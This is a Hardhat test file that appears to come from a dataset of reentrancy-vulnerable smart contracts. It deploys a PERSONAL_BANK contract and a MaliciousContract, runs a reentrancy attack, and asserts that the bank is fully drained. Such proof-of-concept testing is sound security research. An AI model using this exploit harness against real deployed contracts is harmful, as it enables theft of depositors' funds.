const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol", function () {
  let PersonalBank;
  let personalBank;
  let MaliciousContract;
  let maliciousContract;
  let LogFile;
  let logFile;

  beforeEach(async function () {
    // Deploy LogFile contract
    LogFile = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:LogFile");
    logFile = await LogFile.deploy();
    await logFile.waitForDeployment();

    // Deploy PersonalBank contract with LogFile address
    PersonalBank = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:PERSONAL_BANK");
    personalBank = await PersonalBank.deploy();
    await personalBank.waitForDeployment();
    await personalBank.SetLogFile(logFile.target); // Set LogFile address after deployment

    // Deploy MaliciousContract with PersonalBank address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f_attack.sol:MaliciousContract");
    maliciousContract = await MaliciousContract.deploy(personalBank.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to PersonalBank contract
    await personalBank.Deposit({ value: ethers.parseEther("2") });

    // Initial deposit from maliciousContract on PersonalBank
    await maliciousContract.deposit({value:  ethers.parseEther("3")});

    // Perform reentrancy attack through MaliciousContract, must be =< than initial deposit
    await maliciousContract.attack({ value: ethers.parseEther("2") });

    // Check balances after attack
    const personalBankBalance = await ethers.provider.getBalance(personalBank.target);
    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);

    // Verify the attack was successful
    
    // personalBank has a drained account
    expect(personalBankBalance).to.equal(ethers.parseEther("0")); 

    // 2 original balance + 3 from initial deposit +2 from victim fallback function
    expect(maliciousContractBalance).to.equal(ethers.parseEther("7"));
  });
});
